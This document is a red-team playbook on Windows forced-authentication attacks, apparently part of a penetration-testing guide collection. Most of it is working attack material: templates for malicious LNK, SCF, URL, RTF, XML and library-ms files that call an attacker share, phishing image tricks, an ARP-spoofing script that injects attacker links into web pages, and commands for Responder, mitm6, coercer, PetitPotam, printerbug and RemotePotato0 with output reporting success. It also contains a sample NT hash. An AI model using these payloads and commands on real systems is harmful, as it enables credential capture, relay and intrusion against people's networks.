<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Forced Authentication ([`Forced Authentication` TTP](TTP/T1187_Forced_Authentication/T1187.md))
## References

## Overview

Forced authentication can be performed by relying on either social engineering or abuse of vulnerabilities that cause a responding authentication.

The attacks originating from vulnerability abuse are great when they work, as no waiting is necessary and the response is often a machine account. When the vulnerabilities are patched, social engineering is very helpful. Social engineering relies on users to interact with a file (usually just by viewing the file in file explorer). This vector can be achieved commonly through placing the files in file shares or in phishing emails.

Broken out as an outline structure:

* Coerce/Force Authentication
	* Abuse a vulnerability
	* Web Exploitation ([Web App Attack Guide](Testaments_and_Books/Redvelations/Web/000_Web_App_Attack_Guide.md))
		* Stored XSS linking to your SMB Server (e.g., Responder)
	* File Delivery
		* <details><summary>1. Create a malicious file that forces authentication (Click to expand)</summary><p>
			* Word doc with link to attack box
				* Example: `file:////<attacker_hostname_or_IP>/file-not-actually-hosted.txt`
			* Malicious file with icon directed at the attacker
				* Include the additional `.NET` attribute to hide the file from `explorer.exe`
					
						File.SetAttributes(path, FileAttributes.Hidden);
				* Name file starting with a special character if you want alphabetical sort to show the file first
				* Some files may auto-downloaded in browser. Testing needed.
					* `.LNK`
					* `.SCF`
				* Other files
					* `.URL`
					* `.RTF`
					* `.XML`
				* Save word doc as XML file. Update the `href` field to point to attacker address.
			* "IncludePicture"
				* Create a Word document. Add the field `IncludePicture`, with the target URL to the attacker IP `\\10.0.0.5\bad.jpg`
			* PNG files
		* <details><summary>2. Deliver Malicious file (Click to expand)</summary><p>
			* Open File Share
			* Email (Phishing)
	* Capitalize on mistakes
		* Mistyped URL
		* Access invalid shares

## Example Attacks


## Attacks
### Social Engineering

* Trigger WebDAV Service (Allows triggering HTTP Authentication, if successful)
	* <details><summary>Resources (Click to expand)</summary><p>
		* Microsoft Ignite: Using the WebDAV Redirector -<br />[https://docs.microsoft.com/en-us/iis/publish/using-webdav/using-the-webdav-redirector](https://docs.microsoft.com/en-us/iis/publish/using-webdav/using-the-webdav-redirector)
	* <details><summary>Search Connector files (Click to expand)</summary><p>
		* Resources
			* [https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)
			* [https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/)
		* To initiate service, cause a target to open this file (e.g, file share or email)
			* [`Search_Connector_File`](Testaments_and_Books/Redvelations/Windows/Payloads/Search_Connector_File.xml)
* <details><summary>DNS (Click to expand)</summary><p>
	1. Create a new DNS A record (any authenticated user can do it) and point it to your external server
		* PowerMad

				Invoke-DNSUpdate -dnsname <any_name, like "vpn"> -dnsdata <attacker_ip>
	1. On your controlled server `<attacker_ip>`, start Responder and listen for HTTP connections on port 80
	1. Deliver an email with image: `<img src="http://<any_name>.<target's_domain>.<tld>"/>`
		* Optional: make the image 1x1 px or hidden
		* Note that `http://<attacker_DNS_record>` resolves to `<attacker_ip>` (where your Responder is listening on port 80), but only from * inside the offense.local domain
	1. Send the phish to target users from the `<domain>.<tld>` domain
	1. When phish recipients view the email, the user will automatically attempt to load the image from `http://<attacker-ip>`, which * resolves to `http://<attacker_ip>` (where Responder is litening on port 80)
* <details><summary>Word doc with link to attack box (Click to expand)</summary><p>
	
		file:////<attacker_hostname_or_IP>/file-not-actually-hosted.txt
* Malicious file with icon directed at the attacker
	* <details><summary>Tip (Click to expand)</summary><p>
		* Include the additional `.NET` attribute to hide the file from `explorer.exe`

				File.SetAttributes(path, FileAttributes.Hidden);
	* Name file starting with a special character if you want alphabetical sort to show the file first
	* <details><summary>`.LNK` (Click to expand)</summary><p>
		* May auto-download via Chrome/IE, needs testing
		* Examples
			* Example 1: Simple Creation
				1. Copy/paste an LNK file (i.e,. a shortcut file) on a system you have that can currently connect to your attacker box.
				1. Modify the properties of the LNK file so the the icon is targeting a remote share. Specifically, the remote share is the attacker system you have prepared.
					* Note: You'll need the attacker target to be the exact same hostname/IP as you're expecting in the target network. You'll have to repeat this process if you want to change the target.
					* Example Format: `\\<attackerIP>\`
			* Example 2: PowerShell Creation

					$objShell = New-Object -ComObject WScript.Shell
					$lnk = $objShell.CreateShortcut("C:\Malicious.lnk")
					$lnk.TargetPath = "\\<attackerIP>\@threat.png"
					$lnk.WindowStyle = 1
					$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
					$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
					$lnk.HotKey = "Ctrl+Alt+O"
					$lnk.Save()
	* <details><summary>`.SCF` (Click to expand)</summary><p>
		* May auto-download via Chrome/IE, needs testing
		* Create an SCF file for distribution;
		
				`\\<attacker_hostname_or_IP>\tools\asdf.scf`
		* Other

				[Shell]
				Command=2
				IconFile=\\<atttacker_hostname_or_IP>\tools\nc.ico
				[Taskbar]
				Command=ToggleDesktop
	* <details><summary>`.URL` (Click to expand)</summary><p>

			[InternetShortcut]
			URL=whatever
			WorkingDirectory=whatever
			IconFile=\\<attacker_hostname_or_IP>\%USERNAME%.icon
			IconIndex=1
	* <details><summary>`.RTF` (Click to expand)</summary><p>
		* `file.rtf`

				{\rtf1{\field{\*\fldinst {INCLUDEPICTURE "file://<attacker_hostname_or_IP>/test.jpg" \\* MERGEFORMAT\\d}}{\fldrslt}}}
	* <details><summary>`.XML` (Click to expand)</summary><p>
		* Save word doc as XML file. Update the `href` field to point to attacker address.

				<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
				<?mso-application progid="Word.Document"?>
				<?xml-stylesheet type="text/xsl" href="\\<attacker_IP>\bad.xsl" ?>
		* Office Document with "IncludePicture"
			* Word document with new field added, `IncludePicture`. `\\10.0.0.5\bad.jpg`
* Windows Library Files (.library-ms)
	* <details><summary>`file.library-ms` (Click to expand)</summary><p>

			<?xml version="1.0" encoding="UTF-8"?>
			<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
			  <name>@windows.storage.dll,-34582</name>
			  <version>6</version>
			  <isLibraryPinned>true</isLibraryPinned>
			  <iconReference>imageres.dll,-1003</iconReference>
			  <templateInfo>
			    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
			  </templateInfo>
			  <searchConnectorDescriptionList>
			    <searchConnectorDescription>
			      <isDefaultSaveLocation>true</isDefaultSaveLocation>
			      <isSupported>false</isSupported>
			      <simpleLocation>
			        <url>\\\\workstation@8888\\folder</url>
			      </simpleLocation>
			    </searchConnectorDescription>
			  </searchConnectorDescriptionList>
			</libraryDescription>

* <details><summary>"IncludePicture" (Click to expand)</summary><p>
	* Create a Word document. Add the field `IncludePicture`, with the target URL to the attacker IP `\\<attacker_hostname_or_IP>\bad.jpg`
* PNG files (Farmer attack, needs research)

### From a Linux Machine
#### Response Over SMB

* No Credentials, Internal Network Access
	* Overview
		* Often having just VPN access will lead to issues. Direct network access is recommended, and tooling/TTPs are often restricted to your specific subnet.
	* RPC Abuse
		* <details><summary>coercer.py (Click to expand) -<br />[https://github.com/p0dalirius/Coercer](https://github.com/p0dalirius/Coercer)</summary><p>
			* Example

					coercer -t $TARGET -l $LOCAL_IP
				* Example Output

						root@jack-Virtual-Machine:~/ldapsearch-ad# coercer -t $DOMAIN_CONTROLLER -l $LOCAL_IP

						       ______
						      / ____/___  ___  _____________  _____
						     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
						    / /___/ /_/ /  __/ /  / /__/  __/ /      v1.6
						    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

						[dc01.microsoftdelivery.com] Analyzing available protocols on the remote machine and perform RPC calls to coerce authentication to 10.0.0.100 ...
						   [>] Pipe '\PIPE\lsarpc' is accessible!
						      [>] On 'dc01.microsoftdelivery.com' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcOpenFileRaw' (opnum 0) ... ERROR_BAD_NETPATH (Attack has worked!)
						      [>] On 'dc01.microsoftdelivery.com' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 4) ... rpc_s_access_denied
						      [>] On 'dc01.microsoftdelivery.com' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcDecryptFileSrv' (opnum 5) ... rpc_s_access_denied
						      [>] On 'dc01.microsoftdelivery.com' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryUsersOnFile' (opnum 6) ... rpc_s_access_denied
						      [>] On 'dc01.microsoftdelivery.com' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryRecoveryAgents' (opnum 7) ... rpc_s_access_denied
						      [>] On 'dc01.microsoftdelivery.com' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 12) ... rpc_s_access_denied

						[+] All done!
	* <details><summary>ARP Cache Poisoning ([`Adversary-in-the-Middle - ARP Cache Poisoning` TTP](TTP/T1557_Adversary-in-the-Middle/002_ARP_Cache_Poisoning/T1557.002.md), [`Adversary-in-the-Middle - ARP Cache Poisoning` TTP](TTP/T1557_Adversary-in-the-Middle/002_ARP_Cache_Poisoning/T1557.002.md)) (Click to expand)</summary><p>
		1. Reconfigure routing table

				iptables -t nat -A PREROUTING -p tcp --dst 10.55.0.100 --dport 445 -j DNAT --to-destination 10.55.0.30:445
		1. Design cap file according to attack specifics.
			* Bettercap -<br />[https://github.com/bettercap/bettercap](https://github.com/bettercap/bettercap)
				1. Create a `.cap` file for ARP poisioning tool
					* ARP File Option 1
						* ```
						net.probe on```<br>
						```sleep 5```<br>
						```net.probe off```<br>
						<br>
						```net.recon off```<br>
						```set http.proxy.script responder.js```<br>
						<br>
						```http.proxy on```<br>
						```arp.spoof on```<br>
						<br>
						```sleep 1```
						* ```set arp.spoof.targets 10.55.0.2```<br>
						```set arp.spoof.internal true```<br>
						```arp.ban on```
					* `target` - the system which´s ARP cache we want to poison. So that if tries to reach a resource it will be directed to us.
					* The `internal` switch will tell bettercap to do ARP poisoning on its own subnet, otherwise the attack won´t work.
					* `arp.ban on` will start the attack, putting IP forwarding for our box to false, so no packets are passing through.
					* In this case, `responder.js` is used for MITM technique. The contents can be as below, editing `<attacker_hostname_or_IP>`:

							function onLoad() {
							  log("Anchor replace loaded." );
							  log("targets: " + env['arp.spoof.targets']);
							}

							function onResponse(req, res) {
							  var body = res.ReadBody();
							  if( body.indexOf('</body>') != -1 ) {
							      res.Body = body.replace(
							          '</body>',
							          '<img src="file://<attacker_hostname_or_IP>/images/file.jpg" /></body>'
							      );
							  }
							}
			* Eavesarp
		1. Launch ARP spoofing tool
			* <details><summary>Bettercap (Click to expand)</summary><p>

					bettercap -iface <eth0> -caplet <capfile.cap>
	* WPAD
		* <details><summary>Recommended: Responder (Click to expand)</summary><p>

				.
	* LLMNR/NBNS Poisoning
		* <details><summary>Recommended: Responder (Click to expand)</summary><p>
			* Upon initiation, Responder automatically begins poisioning unless `-A` (for Analyze) has been set.
			* Requires editing to `Responder.conf` to set the value of SMB and HTTP to `Off`

			    [Responder Core]
			    ; Servers to start
			    ...
			    SMB = Off     # Turn this off
			    HTTP = Off    # Turn this off
	    	* Example
			
					python Responder.py -I <interface>
	* DNS
		* <details><summary>Overview (Click to expand)</summary><p>
			* In some scenarios, adding a wildcard record to the proper ADIDNS zone won't work. This is usually due to the WINS forward lookup being enabled on that zone. WINS forward lookup makes the DNS server send a NBT-NS Query Request to a predefined WINS server when it receives an address record query for which it doesn't know the answer. In short, it serves the same purpose as the wildcard record. This feature needs to be disabled for the wildcard record to be used.
		* Validate the state of WINS
			* <details><summary>Recommended: krbrelayx.py's dnstool.py (Click to expand)</summary><p>

					dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '@' --action 'query' 'DomainController'
		* Automated
			* <details><summary>Recommended: Responder (Click to expand)</summary><p>

					.
		* Manual
			* <details><summary>Recommended: krbrelayx.py's dnstool.py			 (Click to expand)</summary><p>
				* query a node

						dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController

				* add a node and attach a record

						dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
	* DHCP
		* <details><summary>References (Click to expand)</summary><p>
			* [https://g-laurent.blogspot.com/2021/08/responders-dhcp-poisoner.html](https://g-laurent.blogspot.com/2021/08/responders-dhcp-poisoner.html)
			* [https://twitter.com/pythonresponder/status/1428323316104900608](https://twitter.com/pythonresponder/status/1428323316104900608)
			* [https://twitter.com/PythonResponder/status/1451657791970623490](https://twitter.com/PythonResponder/status/1451657791970623490)
		* <details><summary>Recommended: Responder (Click to expand)</summary><p>
			1. Edit `Responder.conf` to update the WPADScript setting with the below setting. Replace **REPLACEME** with your Responder IP address.

					WPADScript = function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY REPLACEME:3128; PROXY REPLACEME:3141; DIRECT';}
			1. Run Responder. `-d` is the essential flag for this attach, but the additional flags come recommended by the tool author.

					python Responder.py -I <interface> -rPdv
		* <details><summary>Prevention (Click to expand)</summary><p>
			* Microsoft is releasing a new registry key for DHCP WPAD: 
				* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings`
				* `"DisableProxyAuthenticationSchemes"`-> `0x00000004` = DISABLE NTLM
				* Only implemented on Windows 2022 & 11 right now.
	* IPv6
		* <details><summary>Overview (Click to expand)</summary><p>
			* The WPAD file location is only requested via DNS (after MS16-077 update)
			* DNS takeover via IPv6. mitm6 will request an IPv6 address via DHCPv6
		* <details><summary>mitm6 (Click to expand)</summary><p>

				mitm6 --domain $DOMAIN -i $NETWORK_INTERFACE
			* ntlmrelay must use `-6` for relaying
	* <details><summary>SQL (Click to expand)</summary><p>
		* `xp_dirtree` function forces SMB authentication from SQL user
* Domain User Credentials Required
	* Abuse RPC
		* General or Many Methods
			* <details><summary>coercer.py (Click to expand) -<br />[https://github.com/p0dalirius/Coercer](https://github.com/p0dalirius/Coercer)</summary><p>
				* Overview
					* The tool author has enumerated many potential forced authentication endpoints and produced PoCs for each case. The instances need research, but if you run out of options, it may be worth trying. -<br />[https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
				* Example

						./Coercer.py -u username -p password -d domain -f <targets-file> -l <listening_host> --webdav-host
					* Example Output

							root@jack-Virtual-Machine:~# coercer -u domain_user -p 'P@ssw0rd' -d 'microsoftdelivery.com' --dc-ip 10.0.0.1 -t 10.0.0.1 -l 10.0.0.100

							       ______
							      / ____/___  ___  _____________  _____
							     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
							    / /___/ /_/ /  __/ /  / /__/  __/ /      v1.6
							    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

							[10.0.0.1] Analyzing available protocols on the remote machine and perform RPC calls to coerce authentication to 10.0.0.100 ...
							   [>] Pipe '\PIPE\lsarpc' is accessible!
							      [>] On '10.0.0.1' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcOpenFileRaw' (opnum 0) ... ERROR_BAD_NETPATH (Attack has worked!)
							      [>] On '10.0.0.1' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 4) ... ERROR_BAD_NETPATH (Attack has worked!)
							      [>] On '10.0.0.1' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcDecryptFileSrv' (opnum 5) ... ERROR_BAD_NETPATH (Attack has worked!)
							      [>] On '10.0.0.1' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryUsersOnFile' (opnum 6) ... ERROR_BAD_NETPATH (Attack has worked!)
							      [>] On '10.0.0.1' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryRecoveryAgents' (opnum 7) ... ERROR_BAD_NETPATH (Attack has worked!)
							      [>] On '10.0.0.1' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 12) ... ERROR_BAD_NETPATH (Attack has worked!)
							   [>] Pipe '\PIPE\netdfs' is accessible!
							      [>] On '10.0.0.1' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsAddStdRoot' (opnum 12) ... rpc_s_access_denied (Attack should have worked!)
							      [>] On '10.0.0.1' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsRemoveStdRoot' (opnum 13) ... rpc_s_access_denied (Attack should have worked!)
							   [>] Pipe '\PIPE\spoolss' is accessible!
							      [>] On '10.0.0.1' through '\PIPE\spoolss' targeting 'MS-RPRN::RpcRemoteFindFirstPrinterChangeNotificationEx' (opnum 65) ... rpc_s_access_denied (Attack should have worked!)

							[+] All done!
		* MS-RPRN (Print Spooler)
			* <details><summary>Recommended: dementor.py (Click to expand) -<br />[https://github.com/NotMedic/NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)</summary><p>

					./dementor.py RESPONDERIP TARGET -d lab.local -u lab_user -p PASSWORD
				* Example Output

						(impacket) root@gateway0:/home/lab_user/NetNTLMtoSilverTicket# python ./dementor.py 10.0.0.5 10.0.0.4 -d lab.local -u lab_user -p PASSWORD
						[*] connecting to 10.0.0.4
						[*] bound to spoolss
						[*] getting context handle...
						[*] sending RFFPCNEX...
						[*] Got expected RPC_S_SERVER_UNAVAILABLE exception. Attack worked
						[*] done!
			* <details><summary>Printerbug.py -<br />[https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx) (Click to expand)</summary><p>
				
					python printerbug.py <domain>.<tld>/<user>@<target>.<domain>.<tld> <attacker ip/hostname>
		* MS-FSRVP
			* <details><summary>Overview (Click to expand)</summary><p>
				* May require running multiple times to succeed if service has not been run in a while.
				* May not be chainable with webclient abuse, unlike petitpotam
				* Topotam announced the flaw
				* "Unlikely that MS-FSRVP abuse can be combined with WebClient abuse"
			* <details><summary>Recommended: ShadowCoerce (Click to expand) -<br />[https://github.com/ShutdownRepo/ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)</summary><p>
				* Usage

						shadowcoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
		* MS-EFSRPC ("PetitPotam")
			* <details><summary>References (Click to expand)</summary><p>
				* [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-43217]
			* <details><summary>Recommended: ly4k (fka Ollypwn) PetitPotam ([GitHub](https://github.com/ly4k/PetitPotam)) (Click to expand)</summary><p>
				
					python3 petitpotam.py -debug -method AddUsersToFile '<DC IP>' '\\<attacker_IP or attacker_hostname>\<fake_sharename>\<anything>'
				* DC needs to think you're part of the internal network, so you may need to use the attacker's NETBIOS name or such
				* `-method` is optional; default is random; specific options in TTP
				* `-` optional
				* `-debug` optional
			* <details><summary>Topotam PetitPotam ([GitHub](https://github.com/topotam/PetitPotam)) (Click to expand)</summary><p>
				* Currently (2021.10.14), the patch causes authentication from the DC in the user context specified by the script. This could be useful, but you may need to use your imagination or just try other attacks.
		* MS-DFSNM
			* <details><summary>References (Click to expand)</summary><p>
				* [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)
			* <details><summary>Recommended: DFSCoerce -<br />[https://github.com/Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce) (Click to expand)</summary><p>

					.
	* Abuse MS-SQL
		* MSSQL Analysis Corece -<br />[https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

## Kerberos-Specific Forced Authentication

* Force Kerberos Authentication (Necessary for Kerberos Relay attacks)
	* <details><summary>krbrelayx's printerbug.py (Click to expand)</summary><p>

			(krbrelayx) root@jack-Virtual-Machine:~/krbrelayx# python printerbug.py 'microsoftdelivery.com/CA$@dc01.microsoftdelivery.com' -hashes aad3b435b51404eeaad3b435b51404ee:fcbf81ccf4c8b21fa343ca3fbcbf2ff1 attacker1.microsoftdelivery.com
		* Example uses a AES256 key for authentication
		* Example Output

				[*] Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

				[*] Attempting to trigger authentication via rprn RPC at dc01.microsoftdelivery.com
				[*] Bind OK
				[*] Got handle
				DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
				[*] Triggered RPC backconnect, this may or may not have worked

#### Response over LDAP
* Default/Weak Credentials
	* Printers
		* <details><summary>References (Click to expand)</summary><p>
			[https://twitter.com/nullenc0de/status/1091131789924540416](https://twitter.com/nullenc0de/status/1091131789924540416)
		* <details><summary>Manual (Click to expand)</summary><p>
			* Examples
				* Example 1: LDAP Query
					1. Log in to printer
					1. Look for LDAP configured
					1. Select the Attacker IP for target
					1. Initiate an LDAP query
						* Note: You'll want a way to manage the authentication (capture/relay) ahead of this step
					1. 
			* Automated
				* percx's GitHub: Praeda -<br />[https://github.com/percx/Praeda](https://github.com/percx/Praeda)

#### Response over HTTP/s
##### Enable WebDav
* Domain User Credentials Required
	* General or Many Methods
		* <details><summary>coercer.py (Click to expand)</summary><p>
			* Examples
				* Example 1: Coerce WebDAV authentication, Utilize Responder Windows name
					1. Initiate your relay or auth. capturing tool ([AD NTLM Capture and Relay Attacks Guide](Testaments_and_Books/Redvelations/Active_Directory/003-1_AD_NTLM_Capture_and_Relay_Attacks.md))
						* Note: In testing, targeting an ldap domain information dump worked, but adding a machine account did not.
					1. Initiate Responder (if it isn't already initiated in the previous step)

							python3 Responder.py -I eth1
						* <details><summary>Example Output (Click to expand)</summary><p>

							                                         __
							  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
							  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
							  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
							                   |__|

							           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

							  To support this project:
							  Patreon -> https://www.patreon.com/PythonResponder
							  Paypal  -> https://paypal.me/PythonResponder
							  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
							  To kill this script hit CTRL-C


							[+] Poisoners:
							    LLMNR                      [ON]
							    NBT-NS                     [ON]
							    MDNS                       [ON]
							    DNS                        [ON]
							    DHCP                       [OFF]

							[+] Servers:
							    HTTP server                [OFF]
							    HTTPS server               [ON]
							    WPAD proxy                 [OFF]
							    Auth proxy                 [OFF]
							    SMB server                 [OFF]
							    Kerberos server            [ON]
							    SQL server                 [ON]
							    FTP server                 [ON]
							    IMAP server                [ON]
							    POP3 server                [ON]
							    SMTP server                [ON]
							    DNS server                 [ON]
							    LDAP server                [ON]
							    RDP server                 [ON]
							    DCE-RPC server             [ON]
							    WinRM server               [ON]


							[+] HTTP Options:
							    Always serving EXE         [OFF]
							    Serving EXE                [OFF]
							    Serving HTML               [OFF]
							    Upstream Proxy             [OFF]
							                                                                                                                                                                                     
							[+] Poisoning Options:
							    Analyze Mode               [OFF]
							    Force WPAD auth            [OFF]
							    Force Basic Auth           [OFF]
							    Force LM downgrade         [OFF]
							    Force ESS downgrade        [OFF]
							                                                                                                                                                                                     
							[+] Generic Options:
							    Responder NIC              [eth1]
							    Responder IP               [10.0.0.100]
							    Responder IPv6             [fe80::75ba:852d:7164:8f7f]
							    Challenge set              [random]
							    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL'
							                                                                                                                                                                                     
							[+] Current Session Variables:
							    Responder Machine Name     [WIN-8HXSFEBUCWT]
							    Responder Domain Name      [24PT.LOCAL]
							    Responder DCE-RPC Port     [45789]
							                                                                                                                                                                                     
							[+] Listening for events...

					1. Copy the hostname produced by Responder in the line, "Responder Machine Name." Paste it into the below command. Watch the authentication coercion proceed. The target is the system with the WebDAV client running.

							coercer -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -t $TARGET -wh $RESPONDER_MACHINE_NAME
						* <details><summary>Example Output: Responder (Click to expand)</summary><p>

								[*] [NBT-NS] Poisoned answer sent to 10.0.0.101 for name WIN-8HXSFEBUCWT (service: Workstation/Redirector)
								[*] [MDNS] Poisoned answer sent to 10.0.0.101      for name win-8hxsfebucwt.local
								[*] [LLMNR]  Poisoned answer sent to fe80::2132:b6f0:7847:1663 for name win-8hxsfebucwt
								[*] [MDNS] Poisoned answer sent to 10.0.0.101      for name win-8hxsfebucwt.local
								[*] [LLMNR]  Poisoned answer sent to 10.0.0.101 for name win-8hxsfebucwt
								[*] [MDNS] Poisoned answer sent to fe80::2132:b6f0:7847:1663 for name win-8hxsfebucwt.local
						* <details><summary>Example Output: coercer (Click to expand)</summary><p>

								root@jack-Virtual-Machine:~/Responder# coercer -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -t $TARGET -wh WIN-8HXSFEBUCWT

								       ______
								      / ____/___  ___  _____________  _____
								     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
								    / /___/ /_/ /  __/ /  / /__/  __/ /      v1.6
								    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

								[win11] Analyzing available protocols on the remote machine and perform RPC calls to coerce authentication to None ...
								   [>] Pipe '\PIPE\efsrpc' is accessible!
								      [>] On 'win11' through '\PIPE\efsrpc' targeting 'MS-EFSR::EfsRpcOpenFileRaw' (opnum 0) ... nca_s_unk_if
								      [>] On 'win11' through '\PIPE\efsrpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 4) ... nca_s_unk_if
								      [>] On 'win11' through '\PIPE\efsrpc' targeting 'MS-EFSR::EfsRpcDecryptFileSrv' (opnum 5) ... nca_s_unk_if
								      [>] On 'win11' through '\PIPE\efsrpc' targeting 'MS-EFSR::EfsRpcQueryUsersOnFile' (opnum 6) ... nca_s_unk_if
								      [>] On 'win11' through '\PIPE\efsrpc' targeting 'MS-EFSR::EfsRpcQueryRecoveryAgents' (opnum 7) ... nca_s_unk_if
								      [>] On 'win11' through '\PIPE\efsrpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 12) ... nca_s_unk_if
								   [>] Pipe '\PIPE\lsarpc' is accessible!
								      [>] On 'win11' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcOpenFileRaw' (opnum 0) ... rpc_s_access_denied

### From a Windows Machine
#### Remote
##### Response over SMB


##### Response over HTTP/s

#### Local (Domain-Joined)
##### Response over SMB
* <details><summary>DCOM (Click to expand)</summary><p>
	* <details><summary>RemotePotato0 (Click to expand)<br />[https://github.com/antonioCoco/RemotePotato0](https://github.com/antonioCoco/RemotePotato0)</summary><p>
		* Note: Needs testing
		* Examples (aka "Modules")
			* Module 0 - Rpc2Http cross protocol relay server + potato trigger

					sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.0.0.45:9999 &
					sudo ntlmrelayx.py -t ldap://10.0.0.10 --no-wcf-server --escalate-user normal_user
				* Note: if you are on Windows Server <= 2016 you can avoid the network redirector (socat) because the oxid resolution can be performed locally.

						query user
						.\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1
			* Module 1 - Rpc2Http cross protocol relay server

					.\RemotePotato0.exe -m 1 -l 9997 -r 10.0.0.20 
					rpcping -s 127.0.0.1 -e 9997 -a connect -u ntlm
			* Module 2: Rpc capture (hash) server + potato trigger

					query user
					.\RemotePotato0.exe -m 2 -s 1
			* Module 3: Rpc capture (hash) server

					.\RemotePotato0.exe -m 3 -l 9997
					rpcping -s 127.0.0.1 -e 9997 -a connect -u ntlm
	* <details><summary>GhostPotato (Click to expand) -<br />[https://github.com/Ridter/GhostPotato](https://github.com/Ridter/GhostPotato)</summary><p>
		* Note: Needs testing
		* Examples
			* Get high privilege

					python ghost.py -smb2support -of out -c whoami

			* Just low privilege:

					python ghost.py -smb2support -of out --upload rat.exe
* .NET
	* C#
		* MS-RPRN RPC (Printspooler)
			* <details><summary>Recommended: SharpSpoolTrigger (Click to expand)</summary><p>
				* References
					* [https://github.com/cube0x0/SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers)
		* MS-EFS RPC (PetitPotam)
			* <details><summary>SharpEfsTrigger (Click to expand)</summary><p>
				* References
					* [https://github.com/cube0x0/SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers)
		* DCOM Potato triggers
			* <details><summary>SharpDcomTrigger (Click to expand)</summary><p>
				* References
					* [https://github.com/cube0x0/SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers)
* LOLBIN
	* <details><summary>fvenotify.exe (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/cwinfosec/status/1452428878216155149](https://twitter.com/cwinfosec/status/1452428878216155149)
		* Working 2021.10.29
		* Command

				fvenotify \\<attacker>\<ANYTEXT>
* User Context
	* LOLBAS
		* rpcping
		* fvenotify.exe
* Local Admin Credentials Required
	<details><summary>Remote Potato (Click to expand)</summary><p>
		
			RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2

##### Response over LDAP

* Print Compromise (Weak/Default Credentials)
	* [https://github.com/rvrsh3ll/SharpPrinter](https://github.com/rvrsh3ll/SharpPrinter)

##### Response over HTTP/s


## Needs Research

